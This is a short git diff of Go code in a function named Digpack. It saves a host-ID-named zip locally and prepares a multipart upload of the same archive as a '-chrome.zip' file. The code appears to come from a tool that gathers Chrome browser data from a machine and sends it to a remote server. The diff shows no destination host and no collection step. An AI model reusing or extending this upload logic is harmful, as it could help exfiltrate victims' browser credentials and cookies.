@@ -93,13 +93,15 @@ func Digpack(addr string, finflag chan string) {
 		if err != nil {
 			log.Println(err)
 		}
-		f, err := os.OpenFile(Safe_path+lib.HOSTID+"-chrome.zip", os.O_CREATE|os.O_WRONLY, 0666)
+		//not edit name on local
+		f, err := os.OpenFile(Safe_path+lib.HOSTID+".zip", os.O_CREATE|os.O_WRONLY, 0666)
 		if err != nil {
 			log.Println(err)
 		}
 		buf.WriteTo(f)
 		pbuf := new(bytes.Buffer)
 		writer := multipart.NewWriter(pbuf)
+		// edit name for remote
 		formFile, err := writer.CreateFormFile("file", lib.HOSTID+"-chrome.zip")
 		if err != nil {
 			log.Println("Create form file failed: %s\n", err)
